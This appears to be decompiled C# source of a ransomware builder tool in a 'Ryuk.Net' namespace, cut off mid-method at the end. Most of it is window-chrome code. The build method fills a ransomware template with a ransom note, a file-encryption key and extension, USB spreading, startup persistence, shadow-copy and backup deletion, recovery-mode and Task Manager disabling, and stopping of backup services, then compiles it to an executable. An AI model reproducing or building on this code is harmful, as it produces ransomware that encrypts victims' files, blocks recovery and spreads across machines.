using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using Ryuk.Net;
using Ryuk.Net.Properties;

namespace CustomWindowsForm;

public class BlackForm : Form
{
	public class ButtonX : Button
	{
		private Color clr1;

		private Color color = Color.Teal;

		private Color m_hovercolor = Color.FromArgb(0, 0, 140);

		private Color clickcolor = Color.FromArgb(160, 180, 200);

		private int textX = 6;

		private int textY = -20;

		private string text = "_";

		private bool isChanged = true;

		public string DisplayText
		{
			get
			{
				return text;
			}
			set
			{
				text = value;
				((Control)this).Invalidate();
			}
		}

		public Color BZBackColor
		{
			get
			{
				return color;
			}
			set
			{
				color = value;
				((Control)this).Invalidate();
			}
		}

		public Color MouseHoverColor
		{
			get
			{
				return m_hovercolor;
			}
			set
			{
				m_hovercolor = value;
				((Control)this).Invalidate();
			}
		}

		public Color MouseClickColor1
		{
			get
			{
				return clickcolor;
			}
			set
			{
				clickcolor = value;
				((Control)this).Invalidate();
			}
		}

		public bool ChangeColorMouseHC
		{
			get
			{
				return isChanged;
			}
			set
			{
				isChanged = value;
				((Control)this).Invalidate();
			}
		}

		public int TextLocation_X
		{
			get
			{
				return textX;
			}
			set
			{
				textX = value;
				((Control)this).Invalidate();
			}
		}

		public int TextLocation_Y
		{
			get
			{
				return textY;
			}
			set
			{
				textY = value;
				((Control)this).Invalidate();
			}
		}

		public ButtonX()
		{
			//IL_008d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0097: Expected O, but got Unknown
			((Control)this).Size = new Size(31, 24);
			((Control)this).ForeColor = Color.White;
			((ButtonBase)this).FlatStyle = (FlatStyle)0;
			((Control)this).Font = new Font("Microsoft YaHei UI", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
			((Control)this).Text = "_";
			text = ((Control)this).Text;
		}

		protected override void OnMouseEnter(EventArgs e)
		{
			((Button)this).OnMouseEnter(e);
			clr1 = color;
			color = m_hovercolor;
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			((Button)this).OnMouseLeave(e);
			if (isChanged)
			{
				color = clr1;
			}
		}

		protected override void OnMouseDown(MouseEventArgs mevent)
		{
			((ButtonBase)this).OnMouseDown(mevent);
			if (isChanged)
			{
				color = clickcolor;
			}
		}

		protected override void OnMouseUp(MouseEventArgs mevent)
		{
			((Button)this).OnMouseUp(mevent);
			if (isChanged)
			{
				color = clr1;
			}
		}

		protected override void OnPaint(PaintEventArgs pe)
		{
			//IL_0067: Unknown result type (might be due to invalid IL or missing references)
			//IL_0077: Expected O, but got Unknown
			//IL_008f: Unknown result type (might be due to invalid IL or missing references)
			//IL_009f: Expected O, but got Unknown
			((ButtonBase)this).OnPaint(pe);
			text = ((Control)this).Text;
			if (textX == 100 && textY == 25)
			{
				textX = ((Control)this).Width / 3 + 10;
				textY = ((Control)this).Height / 2 - 1;
			}
			Point point = new Point(textX, textY);
			pe.Graphics.FillRectangle((Brush)new SolidBrush(color), ((Control)this).ClientRectangle);
			pe.Graphics.DrawString(text, ((Control)this).Font, (Brush)new SolidBrush(((Control)this).ForeColor), (PointF)point);
		}
	}

	public class ButtonZ : Button
	{
		private Color clr1;

		private Color color = Color.Teal;

		private Color m_hovercolor = Color.FromArgb(0, 0, 140);

		private Color clickcolor = Color.FromArgb(160, 180, 200);

		private int textX = 6;

		private int textY = -20;

		private string text = "_";

		public string DisplayText
		{
			get
			{
				return text;
			}
			set
			{
				text = value;
				((Control)this).Invalidate();
			}
		}

		public Color BZBackColor
		{
			get
			{
				return color;
			}
			set
			{
				color = value;
				((Control)this).Invalidate();
			}
		}

		public Color MouseHoverColor
		{
			get
			{
				return m_hovercolor;
			}
			set
			{
				m_hovercolor = value;
				((Control)this).Invalidate();
			}
		}

		public Color MouseClickColor1
		{
			get
			{
				return clickcolor;
			}
			set
			{
				clickcolor = value;
				((Control)this).Invalidate();
			}
		}

		public int TextLocation_X
		{
			get
			{
				return textX;
			}
			set
			{
				textX = value;
				((Control)this).Invalidate();
			}
		}

		public int TextLocation_Y
		{
			get
			{
				return textY;
			}
			set
			{
				textY = value;
				((Control)this).Invalidate();
			}
		}

		public ButtonZ()
		{
			//IL_0086: Unknown result type (might be due to invalid IL or missing references)
			//IL_0090: Expected O, but got Unknown
			((Control)this).Size = new Size(31, 24);
			((Control)this).ForeColor = Color.White;
			((ButtonBase)this).FlatStyle = (FlatStyle)0;
			((Control)this).Font = new Font("Microsoft YaHei UI", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
			((Control)this).Text = "_";
			text = ((Control)this).Text;
		}

		protected override void OnMouseEnter(EventArgs e)
		{
			((Button)this).OnMouseEnter(e);
			clr1 = color;
			color = m_hovercolor;
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			((Button)this).OnMouseLeave(e);
			color = clr1;
		}

		protected override void OnMouseDown(MouseEventArgs mevent)
		{
			((ButtonBase)this).OnMouseDown(mevent);
			color = clickcolor;
		}

		protected override void OnMouseUp(MouseEventArgs mevent)
		{
			((Button)this).OnMouseUp(mevent);
			color = clr1;
		}

		protected override void OnPaint(PaintEventArgs pe)
		{
			//IL_0067: Unknown result type (might be due to invalid IL or missing references)
			//IL_0077: Expected O, but got Unknown
			//IL_008f: Unknown result type (might be due to invalid IL or missing references)
			//IL_009f: Expected O, but got Unknown
			((ButtonBase)this).OnPaint(pe);
			text = ((Control)this).Text;
			if (textX == 100 && textY == 25)
			{
				textX = ((Control)this).Width / 3 + 10;
				textY = ((Control)this).Height / 2 - 1;
			}
			Point point = new Point(textX, textY);
			pe.Graphics.FillRectangle((Brush)new SolidBrush(color), ((Control)this).ClientRectangle);
			pe.Graphics.DrawString(text, ((Control)this).Font, (Brush)new SolidBrush(((Control)this).ForeColor), (PointF)point);
		}
	}

	public class MinMaxButton : Button
	{
		public enum CustomFormState
		{
			Normal,
			Maximize
		}

		private Color clr1;

		private Color color = Color.Gray;

		private Color m_hovercolor = Color.FromArgb(180, 200, 240);

		private Color clickcolor = Color.FromArgb(160, 180, 200);

		private int textX = 6;

		private int textY = -20;

		private string text = "_";

		private CustomFormState _customFormState;

		public CustomFormState CFormState
		{
			get
			{
				return _customFormState;
			}
			set
			{
				_customFormState = value;
				((Control)this).Invalidate();
			}
		}

		public string DisplayText
		{
			get
			{
				return text;
			}
			set
			{
				text = value;
				((Control)this).Invalidate();
			}
		}

		public Color BZBackColor
		{
			get
			{
				return color;
			}
			set
			{
				color = value;
				((Control)this).Invalidate();
			}
		}

		public Color MouseHoverColor
		{
			get
			{
				return m_hovercolor;
			}
			set
			{
				m_hovercolor = value;
				((Control)this).Invalidate();
			}
		}

		public Color MouseClickColor1
		{
			get
			{
				return clickcolor;
			}
			set
			{
				clickcolor = value;
				((Control)this).Invalidate();
			}
		}

		public int TextLocation_X
		{
			get
			{
				return textX;
			}
			set
			{
				textX = value;
				((Control)this).Invalidate();
			}
		}

		public int TextLocation_Y
		{
			get
			{
				return textY;
			}
			set
			{
				textY = value;
				((Control)this).Invalidate();
			}
		}

		public MinMaxButton()
		{
			((Control)this).Size = new Size(31, 24);
			((Control)this).ForeColor = Color.White;
			((ButtonBase)this).FlatStyle = (FlatStyle)0;
			((Control)this).Text = "_";
			text = ((Control)this).Text;
		}

		protected override void OnMouseEnter(EventArgs e)
		{
			((Button)this).OnMouseEnter(e);
			clr1 = color;
			color = m_hovercolor;
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			((Button)this).OnMouseLeave(e);
			color = clr1;
		}

		protected override void OnMouseDown(MouseEventArgs mevent)
		{
			((ButtonBase)this).OnMouseDown(mevent);
			color = clickcolor;
		}

		protected override void OnMouseUp(MouseEventArgs mevent)
		{
			((Button)this).OnMouseUp(mevent);
			color = clr1;
		}

		protected override void OnPaint(PaintEventArgs pe)
		{
			//IL_0022: Unknown result type (might be due to invalid IL or missing references)
			//IL_0032: Expected O, but got Unknown
			//IL_0042: Unknown result type (might be due to invalid IL or missing references)
			//IL_0060: Expected O, but got Unknown
			//IL_006c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0089: Expected O, but got Unknown
			//IL_009e: Unknown result type (might be due to invalid IL or missing references)
			//IL_00ae: Expected O, but got Unknown
			//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
			//IL_00db: Expected O, but got Unknown
			//IL_00e7: Unknown result type (might be due to invalid IL or missing references)
			//IL_0104: Expected O, but got Unknown
			//IL_0110: Unknown result type (might be due to invalid IL or missing references)
			//IL_012c: Expected O, but got Unknown
			//IL_0138: Unknown result type (might be due to invalid IL or missing references)
			//IL_0155: Expected O, but got Unknown
			((ButtonBase)this).OnPaint(pe);
			switch (_customFormState)
			{
			case CustomFormState.Normal:
			{
				pe.Graphics.FillRectangle((Brush)new SolidBrush(color), ((Control)this).ClientRectangle);
				for (int j = 0; j < 2; j++)
				{
					pe.Graphics.DrawRectangle(new Pen(((Control)this).ForeColor), textX + j + 1, textY, 10, 10);
					pe.Graphics.FillRectangle((Brush)new SolidBrush(((Control)this).ForeColor), textX + 1, textY - 1, 12, 4);
				}
				break;
			}
			case CustomFormState.Maximize:
			{
				pe.Graphics.FillRectangle((Brush)new SolidBrush(color), ((Control)this).ClientRectangle);
				for (int i = 0; i < 2; i++)
				{
					pe.Graphics.DrawRectangle(new Pen(((Control)this).ForeColor), textX + 5, textY, 8, 8);
					pe.Graphics.FillRectangle((Brush)new SolidBrush(((Control)this).ForeColor), textX + 5, textY - 1, 9, 4);
					pe.Graphics.DrawRectangle(new Pen(((Control)this).ForeColor), textX + 2, textY + 5, 8, 8);
					pe.Graphics.FillRectangle((Brush)new SolidBrush(((Control)this).ForeColor), textX + 2, textY + 4, 9, 4);
				}
				break;
			}
			}
		}
	}

	private bool isTopPanelDragged;

	private bool isLeftPanelDragged;

	private bool isRightPanelDragged;

	private bool isBottomPanelDragged;

	private bool isTopBorderPanelDragged;

	private bool isRightBottomPanelDragged;

	private bool isLeftBottomPanelDragged;

	private bool isRightTopPanelDragged;

	private bool isLeftTopPanelDragged;

	private bool isWindowMaximized;

	private Point offset;

	private Size _normalWindowSize;

	private Point _normalWindowLocation = Point.Empty;

	private string iconLocation = "";

	private string forMutex = "oAnWieozQPsRK7Bj83r4";

	private IContainer components;

	private Panel RightPanel;

	private Panel TopPanel;

	private ButtonZ _CloseButton;

	private Panel RightBottomPanel_1;

	private Label WindowTextLabel;

	private MinMaxButton _MaxButton;

	private Panel panel2;

	private ButtonZ _MinButton;

	private Panel RightBottomPanel_2;

	private Panel LeftBottomPanel_2;

	private Panel RightTopPanel_1;

	private Panel RightTopPanel_2;

	private CheckBox usbSpreadCheckBox;

	private TextBox textBox1;

	private SaveFileDialog saveFileDialog1;

	private CheckBox checkBox1;

	private TextBox textBox2;

	private TextBox spreadNameText;

	private CheckBox checkBox2;

	private TextBox textBox4;

	private CheckBox startupcheckBox3;

	private OpenFileDialog openFileDialog1;

	private PictureBox pictureBox1;

	private Label selectIconLabel;

	private CheckBox sleepCheckBox;

	private TextBox SleepTextBox;

	private TextBox droppedMessageTextbox;

	private Label label1;

	private Button button2;

	private Button button3;

	private Button button4;

	private Button button1;

	public BlackForm()
	{
		InitializeComponent();
	}

	private void BlackForm_Load(object sender, EventArgs e)
	{
		setValue();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			try
			{
				if (process.MainModule.FileName.Contains(folderPath))
				{
					process.Kill();
				}
			}
			catch
			{
			}
		}
	}

	private bool setValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + forMutex);
			registryKey.SetValue(forMutex, forMutex);
			registryKey.Close();
			return true;
		}
		catch
		{
			return false;
		}
	}

	private void TopBorderPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		if ((int)e.Button == 1048576)
		{
			isTopBorderPanelDragged = true;
		}
		else
		{
			isTopBorderPanelDragged = false;
		}
	}

	private void TopBorderPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.Y < ((Form)this).Location.Y && isTopBorderPanelDragged)
		{
			if (((Control)this).Height < 50)
			{
				((Control)this).Height = 50;
				isTopBorderPanelDragged = false;
				return;
			}
			int x = ((Form)this).Location.X;
			int y = ((Form)this).Location.Y + e.Y;
			((Form)this).Location = new Point(x, y);
			((Control)this).Height = ((Control)this).Height - e.Y;
		}
	}

	private void TopBorderPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isTopBorderPanelDragged = false;
	}

	private void TopPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		if ((int)e.Button == 1048576)
		{
			isTopPanelDragged = true;
			Point point = ((Control)this).PointToScreen(new Point(e.X, e.Y));
			offset = default(Point);
			offset.X = ((Form)this).Location.X - point.X;
			offset.Y = ((Form)this).Location.Y - point.Y;
		}
		else
		{
			isTopPanelDragged = false;
		}
		if (e.Clicks == 2)
		{
			isTopPanelDragged = false;
			_MaxButton_Click(sender, (EventArgs)(object)e);
		}
	}

	private void TopPanel_MouseMove(object sender, MouseEventArgs e)
	{
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Invalid comparison between Unknown and I4
		if (isTopPanelDragged)
		{
			Point location = ((Control)TopPanel).PointToScreen(new Point(e.X, e.Y));
			location.Offset(offset);
			((Form)this).Location = location;
			int num = ((((Form)this).Location.X <= 2 && ((Form)this).Location.Y <= 2) ? 1 : 0);
			if (num == 0 && (int)((Form)this).WindowState == 2)
			{
				((Form)this).Location = _normalWindowLocation;
				((Form)this).Size = _normalWindowSize;
				_MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
				isWindowMaximized = false;
			}
		}
	}

	private void TopPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isTopPanelDragged = false;
		if (((Form)this).Location.Y <= 5 && !isWindowMaximized)
		{
			_normalWindowSize = ((Form)this).Size;
			_normalWindowLocation = ((Form)this).Location;
			Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
			((Form)this).Location = new Point(0, 0);
			((Form)this).Size = new Size(workingArea.Width, workingArea.Height);
			_MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
			isWindowMaximized = true;
		}
	}

	private void LeftPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Invalid comparison between Unknown and I4
		if (((Form)this).Location.X <= 0 || e.X < 0)
		{
			isLeftPanelDragged = false;
			((Form)this).Location = new Point(10, ((Form)this).Location.Y);
		}
		else
		{
			isLeftPanelDragged = (int)e.Button == 1048576;
		}
	}

	private void LeftPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.X < ((Form)this).Location.X && isLeftPanelDragged)
		{
			if (((Control)this).Width < 100)
			{
				((Control)this).Width = 100;
				isLeftPanelDragged = false;
			}
			else
			{
				((Form)this).Location = new Point(((Form)this).Location.X + e.X, ((Form)this).Location.Y);
				((Control)this).Width = ((Control)this).Width - e.X;
			}
		}
	}

	private void LeftPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isLeftPanelDragged = false;
	}

	private void RightPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		if ((int)e.Button == 1048576)
		{
			isRightPanelDragged = true;
		}
		else
		{
			isRightPanelDragged = false;
		}
	}

	private void RightPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (isRightPanelDragged)
		{
			if (((Control)this).Width < 100)
			{
				((Control)this).Width = 100;
				isRightPanelDragged = false;
			}
			else
			{
				((Control)this).Width = ((Control)this).Width + e.X;
			}
		}
	}

	private void RightPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isRightPanelDragged = false;
	}

	private void BottomPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		if ((int)e.Button == 1048576)
		{
			isBottomPanelDragged = true;
		}
		else
		{
			isBottomPanelDragged = false;
		}
	}

	private void BottomPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (isBottomPanelDragged)
		{
			if (((Control)this).Height < 50)
			{
				((Control)this).Height = 50;
				isBottomPanelDragged = false;
			}
			else
			{
				((Control)this).Height = ((Control)this).Height + e.Y;
			}
		}
	}

	private void BottomPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isBottomPanelDragged = false;
	}

	private void _MinButton_Click(object sender, EventArgs e)
	{
		((Form)this).WindowState = (FormWindowState)1;
	}

	private void _MaxButton_Click(object sender, EventArgs e)
	{
		if (isWindowMaximized)
		{
			((Form)this).Location = _normalWindowLocation;
			((Form)this).Size = _normalWindowSize;
			_MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
			isWindowMaximized = false;
		}
		else
		{
			_normalWindowSize = ((Form)this).Size;
			_normalWindowLocation = ((Form)this).Location;
			Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
			((Form)this).Location = new Point(0, 0);
			((Form)this).Size = new Size(workingArea.Width, workingArea.Height);
			_MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
			isWindowMaximized = true;
		}
	}

	private void _CloseButton_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void RightBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isRightBottomPanelDragged = true;
	}

	private void RightBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if (isRightBottomPanelDragged)
		{
			if (((Control)this).Width < 100 || ((Control)this).Height < 50)
			{
				((Control)this).Width = 100;
				((Control)this).Height = 50;
				isRightBottomPanelDragged = false;
			}
			else
			{
				((Control)this).Width = ((Control)this).Width + e.X;
				((Control)this).Height = ((Control)this).Height + e.Y;
			}
		}
	}

	private void RightBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isRightBottomPanelDragged = false;
	}

	private void RightBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		RightBottomPanel_1_MouseDown(sender, e);
	}

	private void RightBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		RightBottomPanel_1_MouseMove(sender, e);
	}

	private void RightBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		RightBottomPanel_1_MouseUp(sender, e);
	}

	private void LeftBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isLeftBottomPanelDragged = true;
	}

	private void LeftBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.X < ((Form)this).Location.X && (isLeftBottomPanelDragged || ((Control)this).Height < 50))
		{
			if (((Control)this).Width < 100)
			{
				((Control)this).Width = 100;
				((Control)this).Height = 50;
				isLeftBottomPanelDragged = false;
			}
			else
			{
				((Form)this).Location = new Point(((Form)this).Location.X + e.X, ((Form)this).Location.Y);
				((Control)this).Width = ((Control)this).Width - e.X;
				((Control)this).Height = ((Control)this).Height + e.Y;
			}
		}
	}

	private void LeftBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isLeftBottomPanelDragged = false;
	}

	private void LeftBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		LeftBottomPanel_1_MouseDown(sender, e);
	}

	private void LeftBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		LeftBottomPanel_1_MouseMove(sender, e);
	}

	private void LeftBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		LeftBottomPanel_1_MouseUp(sender, e);
	}

	private void RightTopPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isRightTopPanelDragged = true;
	}

	private void RightTopPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if ((e.Y < ((Form)this).Location.Y || e.X < ((Form)this).Location.X) && isRightTopPanelDragged)
		{
			if (((Control)this).Height < 50 || ((Control)this).Width < 100)
			{
				((Control)this).Height = 50;
				((Control)this).Width = 100;
				isRightTopPanelDragged = false;
			}
			else
			{
				((Form)this).Location = new Point(((Form)this).Location.X, ((Form)this).Location.Y + e.Y);
				((Control)this).Height = ((Control)this).Height - e.Y;
				((Control)this).Width = ((Control)this).Width + e.X;
			}
		}
	}

	private void RightTopPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isRightTopPanelDragged = false;
	}

	private void RightTopPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		RightTopPanel_1_MouseDown(sender, e);
	}

	private void RightTopPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		RightTopPanel_1_MouseMove(sender, e);
	}

	private void RightTopPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		RightTopPanel_1_MouseUp(sender, e);
	}

	private void LeftTopPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isLeftTopPanelDragged = true;
	}

	private void LeftTopPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if ((e.X < ((Form)this).Location.X || e.Y < ((Form)this).Location.Y) && isLeftTopPanelDragged)
		{
			if (((Control)this).Width < 100 || ((Control)this).Height < 50)
			{
				((Control)this).Width = 100;
				((Control)this).Height = 100;
				isLeftTopPanelDragged = false;
				return;
			}
			int x = ((Form)this).Location.X + e.X;
			int y = ((Form)this).Location.Y;
			((Form)this).Location = new Point(x, y);
			((Control)this).Width = ((Control)this).Width - e.X;
			int x2 = ((Form)this).Location.X;
			int y2 = ((Form)this).Location.Y + e.Y;
			((Form)this).Location = new Point(x2, y2);
			((Control)this).Height = ((Control)this).Height - e.Y;
		}
	}

	private void LeftTopPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isLeftTopPanelDragged = false;
	}

	private void LeftTopPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		LeftTopPanel_1_MouseDown(sender, e);
	}

	private void LeftTopPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		LeftTopPanel_1_MouseMove(sender, e);
	}

	private void LeftTopPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		LeftTopPanel_1_MouseUp(sender, e);
	}

	private void file_button_Click(object sender, EventArgs e)
	{
	}

	private void edit_button_Click(object sender, EventArgs e)
	{
	}

	private void view_button_Click(object sender, EventArgs e)
	{
	}

	private void run_button_Click(object sender, EventArgs e)
	{
	}

	private void help_button_Click(object sender, EventArgs e)
	{
	}

	private void WindowTextLabel_MouseDown(object sender, MouseEventArgs e)
	{
		TopPanel_MouseDown(sender, e);
	}

	private void WindowTextLabel_MouseMove(object sender, MouseEventArgs e)
	{
		TopPanel_MouseMove(sender, e);
	}

	private void WindowTextLabel_MouseUp(object sender, MouseEventArgs e)
	{
		TopPanel_MouseUp(sender, e);
	}

	private void shapedButton3_Click(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		((Form)new Form2()).ShowDialog();
	}

	private void shapedButton4_Click(object sender, EventArgs e)
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Unknown result type (might be due to invalid IL or missing references)
		//IL_020e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0486: Unknown result type (might be due to invalid IL or missing references)
		//IL_055c: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e8: Expected O, but got Unknown
		//IL_05f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_05fc: Invalid comparison between Unknown and I4
		if (((Control)textBox1).Text.Trim().Length < 1)
		{
			MessageBox.Show("Please type your message!", "Read_it.txt", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		if (string.IsNullOrWhiteSpace("aa"))
		{
			MessageBox.Show("All fields are required", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < ((TextBoxBase)textBox1).Lines.Length; i++)
		{
			string text = ((TextBoxBase)textBox1).Lines[i].Replace("\"", "'");
			stringBuilder.Append("\"" + text + "\",\n");
		}
		string text2 = Resources.Source.Replace("#messages", stringBuilder.ToString());
		string text3;
		if (checkBox1.Checked)
		{
			text3 = text2.Replace("#encryptedFileExtension", "");
		}
		else
		{
			string text4 = ((Control)textBox2).Text;
			if (text4.Contains("."))
			{
				text4 = text4.Replace(".", "");
			}
			text3 = text2.Replace("#encryptedFileExtension", text4);
		}
		string text5;
		if (checkBox2.Checked)
		{
			if (((Control)textBox4).Text.Trim().Length < 1)
			{
				MessageBox.Show("Proccess name field is empty");
				return;
			}
			text5 = ((!((Control)textBox4).Text.EndsWith(".exe")) ? text3.Replace("#copyRoaming", "true").Replace("#exeName", ((Control)textBox4).Text + ".exe") : text3.Replace("#copyRoaming", "true").Replace("#exeName", ((Control)textBox4).Text));
		}
		else
		{
			text5 = text3.Replace("#copyRoaming", "false").Replace("#exeName", ((Control)textBox4).Text);
		}
		string text6;
		if (usbSpreadCheckBox.Checked)
		{
			if (((Control)spreadNameText).Text.Trim().Length < 1)
			{
				MessageBox.Show("Usb spread name field is empty");
				return;
			}
			text6 = ((!((Control)spreadNameText).Text.EndsWith(".exe")) ? text5.Replace("#checkSpread", "true").Replace("#spreadName", ((Control)spreadNameText).Text + ".exe") : text5.Replace("#checkSpread", "true").Replace("#spreadName", ((Control)spreadNameText).Text));
		}
		else
		{
			text6 = text5.Replace("#checkSpread", "false").Replace("#spreadName", ((Control)spreadNameText).Text);
		}
		string text7 = ((!startupcheckBox3.Checked) ? text6.Replace("#startupFolder", "true") : text6.Replace("#startupFolder", "true"));
		string text8 = ((!sleepCheckBox.Checked) ? text7.Replace("#checkSleep", "false").Replace("#sleepTextbox", ((Control)SleepTextBox).Text) : text7.Replace("#checkSleep", "true").Replace("#sleepTextbox", ((Control)SleepTextBox).Text));
		string text9 = ((!Settings.Default.checkAdminPrivilage) ? text8.Replace("#adminPrivilage", "false") : text8.Replace("#adminPrivilage", "true"));
		string text10 = ((!Settings.Default.deleteBackupCatalog) ? text9.Replace("#checkdeleteBackupCatalog", "false") : text9.Replace("#checkdeleteBackupCatalog", "true"));
		string text11 = ((!Settings.Default.deleteShadowCopies) ? text10.Replace("#checkdeleteShadowCopies", "false") : text10.Replace("#checkdeleteShadowCopies", "true"));
		string text12 = ((!Settings.Default.disableRecoveryMode) ? text11.Replace("#checkdisableRecoveryMode", "false") : text11.Replace("#checkdisableRecoveryMode", "true"));
		string text13 = ((!Settings.Default.disableTaskManager) ? text12.Replace("#checkdisableTaskManager", "false") : text12.Replace("#checkdisableTaskManager", "true"));
		string text14 = ((!Settings.Default.stopBackupServices) ? text13.Replace("#checkStopBackupServices", "false") : text13.Replace("#checkStopBackupServices", "true"));
		if (((Control)droppedMessageTextbox).Text.Trim().Length < 1)
		{
			MessageBox.Show("Dropped message name field is empty");
			return;
		}
		string text15 = text14.Replace("#droppedMessageTextbox", ((Control)droppedMessageTextbox).Text);
		string publicKey = Settings.Default.publicKey;
		if (Settings.Default.encryptOption)
		{
			if (!(publicKey != ""))
			{
				MessageBox.Show("Decrypter name field is empty. Go to \"Decrypter & Options\" and create or select decrypter", "Advanced Option");
				return;
			}
			using StringReader stringReader = new StringReader(publicKey);
			StringBuilder stringBuilder2 = new StringBuilder();
			string text16;
			while ((text16 = stringReader.ReadLine()) != null)
			{
				string text17 = text16.Replace("\"", "\\\"");
				stringBuilder2.AppendLine("pubclicKey.AppendLine(\"" + text17 + "\");");
			}
			text15 = text15.Replace("#encryptOption", "true");
			text15 = text15.Replace("#publicKey", stringBuilder2.ToString());
		}
		else
		{
			text15 = text15.Replace("#encryptOption", "false").Replace("#publicKey", "");
		}
		if (Settings.Default.base64Image != "")
		{
			text15 = text15.Replace("#base64Image", Settings.Default.base64Image);
		}
		if (Settings.Default.extensions != "")
		{
			text15 = text15.Replace("#extensions", Settings.Default.extensions);
		}
		SaveFileDialog val = new SaveFileDialog();
		try
		{
			((FileDialog)val).Filter = "Executable (*.exe)|*.exe";
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				new Compiler(text15, ((FileDialog)val).FileName, iconLocation);
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void saveFileDialog1_FileOk(object sender, CancelEventArgs e)
	{
	}

	private void panel2_Paint(object sender, PaintEventArgs e)
	{
	}

	private void checkBox1_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)textBox2).Enabled)
		{
			((Control)textBox2).Enabled = true;
		}
		else
		{
			((Control)textBox2).Enabled = false;
		}
	}

	private void usbSpreadCheckBox_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)spreadNameText).Enabled)
		{
			((Control)spreadNameText).Enabled = true;
		}
		else
		{
			((Control)spreadNameText).Enabled = false;
		}
	}

	private void checkBox2_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)textBox4).Enabled)
		{
			((Control)textBox4).Enabled = true;
		}
		else
		{
			((Control)textBox4).Enabled = false;
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Invalid comparison between Unknown and I4
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		OpenFileDialog val = new OpenFileDialog();
		try
		{
			((FileDialog)val).Filter = "Icons (*.ico)|*.ico";
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				iconLocation = ((FileDialog)val).FileName;
